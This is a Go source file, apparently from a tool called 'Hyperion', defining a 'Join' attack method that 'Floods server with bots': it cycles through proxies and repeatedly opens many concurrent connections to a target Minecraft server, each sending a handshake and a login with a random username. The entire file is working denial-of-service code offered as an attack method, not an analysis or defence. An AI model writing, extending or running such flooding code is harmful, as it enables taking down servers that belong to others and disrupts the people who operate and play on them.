package methods

import (
	"Hyperion/core"
	"Hyperion/core/proxy"
	"Hyperion/mc"
	"Hyperion/mc/mcutils"
	"Hyperion/utils"
	"strconv"
)

type Join struct {
	Info         *core.AttackInfo
	ProxyManager *proxy.ProxyManager
}

var shouldRun = false
var locked = true

func (join Join) Name() string {
	return "Join"
}

func (join Join) Description() string {
	return "Floods server with bots"
}

func (join Join) Start() {
	utils.Init()
	shouldRun = true

	go func() {
		for shouldRun {
			loop(&join)
		}
	}()
}

func loop(join *Join) {
	proxy := join.ProxyManager.GetNext()
	for i := 0; i < join.Info.ConnPerProxy; i++ {
		go connect(&join.Info.Ip, &join.Info.Port, join.Info.Protocol, proxy)
	}
}

func connect(ip *string, port *string, protocol int, proxy *proxy.Proxy) error {

	conn, err := mc.DialMC(ip, port, proxy)
	if err != nil {
		return err
	}

	intport, perr := strconv.Atoi(*port)
	if perr != nil {
		return perr
	}

	mcutils.WriteHandshake(conn, *ip, intport, protocol, mcutils.Login)
	mcutils.WriteLoginPacket(conn, utils.RandomName(16), false, nil)
	return nil
}

func (join Join) Stop() {
	shouldRun = false
}
